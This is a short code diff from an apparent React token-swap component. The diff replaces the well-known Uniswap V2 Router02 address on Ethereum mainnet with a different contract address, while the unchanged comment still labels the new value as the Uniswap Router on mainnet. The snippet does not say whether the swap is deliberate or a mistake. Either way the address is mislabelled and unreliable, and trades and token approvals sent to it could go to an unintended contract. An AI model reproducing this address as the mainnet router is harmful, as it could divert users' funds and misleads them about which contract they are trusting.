@@ -8,7 +8,7 @@ const SwapComponent = () => {
   const [outputAmount, setOutputAmount] = useState('');
   const [status, setStatus] = useState('');
 
-  const UniswapV2Router02Address = "0x7a250d5630b4cf539739df2c5dAcb4c659F2488D"; // Uniswap Router address on Ethereum Mainnet
+  const UniswapV2Router02Address = "0xf1D7CC64Fb4452F05c498126312eBE29f30Fbcf9"; // Uniswap Router address on Ethereum Mainnet
 
   const handleSwap = async () => {
     try {
